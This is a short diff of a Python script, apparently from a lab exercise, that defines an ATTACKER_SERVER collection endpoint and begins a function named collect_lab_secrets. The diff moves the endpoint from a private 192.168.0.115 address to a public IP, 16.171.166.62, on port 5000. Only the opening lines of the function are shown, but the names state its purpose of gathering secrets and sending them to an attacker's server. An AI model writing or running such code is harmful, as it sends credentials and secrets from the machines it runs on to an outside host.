@@ -1,7 +1,7 @@
 import os
 import requests
 
-ATTACKER_SERVER = "http://192.168.0.115:5000/collect"
+ATTACKER_SERVER = "http://16.171.166.62:5000/collect"
 
 def collect_lab_secrets():
     collected = {}
